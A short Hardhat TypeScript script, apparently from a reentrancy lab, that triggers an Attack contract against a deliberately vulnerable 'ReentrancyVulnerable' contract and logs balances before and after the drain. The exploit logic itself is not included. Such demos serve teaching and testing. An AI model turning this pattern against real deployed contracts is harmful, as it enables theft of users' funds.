import { ethers, network } from "hardhat"
import { ReentrancyVulnerable } from "../typechain-types"
import { Attack } from "../typechain-types"

// yarn hardhat run scripts/interact.ts
// npx hardhat run scripts/interact.ts
// hh run scripts/interact.ts

async function attackVictim() {
    const accounts = await ethers.getSigners()
    const attacker = accounts[1]
    const DEPOSIT_ETHERS = ethers.utils.parseEther("0.1")

    const reentrancyVulnerable: ReentrancyVulnerable = await ethers.getContract("ReentrancyVulnerable")
    const attackContract: Attack = await ethers.getContract("Attack")
    // const attackContract = await contract.connect(attacker)

    const victimBalBeforeAttack = await ethers.provider.getBalance(reentrancyVulnerable.address)
    console.log(`Victim Value Before Attack: ${ethers.utils.formatUnits(victimBalBeforeAttack)} ETH`)

    const executeAttackTx = await attackContract.attack({
        value: DEPOSIT_ETHERS,
    })
    await executeAttackTx.wait(1)

    const victimBalAfterAttack = await ethers.provider.getBalance(reentrancyVulnerable.address)
    console.log(`Victim Value After Attack: ${ethers.utils.formatUnits(victimBalAfterAttack)} ETH`)
    const attackBal = await ethers.provider.getBalance(attackContract.address)
    console.log(`Attack Value: ${ethers.utils.formatUnits(attackBal)} ETH`)
}

attackVictim()
    .then(() => process.exit(0))
    .catch((error: any) => {
        console.error(error)
        process.exit(1)
    })
